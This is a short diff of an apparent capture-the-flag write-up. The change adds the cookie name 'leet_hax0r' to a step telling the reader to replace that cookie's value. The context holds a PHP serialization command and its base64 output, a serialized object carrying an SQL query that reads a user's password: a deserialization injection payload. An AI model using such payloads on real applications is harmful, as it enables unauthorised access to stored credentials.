@@ -122,7 +122,7 @@ php > echo urlencode(base64_encode(serialize($sql)));
 TzozOiJTUUwiOjI6e3M6NToicXVlcnkiO3M6NjE6IlNFTEVDVCBwYXNzd29yZCBhcyB1c2VybmFtZSBGUk9NIHVzZXJzIFdIRVJFIHVzZXJuYW1lPSdmbGFnJzsiO3M6NDoiY29ubiI7Tjt9
 ```
 
-Modify the `` cookie value to our value.  
+Modify the `leet_hax0r` cookie value to our value.  
 
 ![image](https://user-images.githubusercontent.com/44528004/132871370-ff4b11c1-f9d4-41fe-9a12-62b43a5c71d4.png)
 
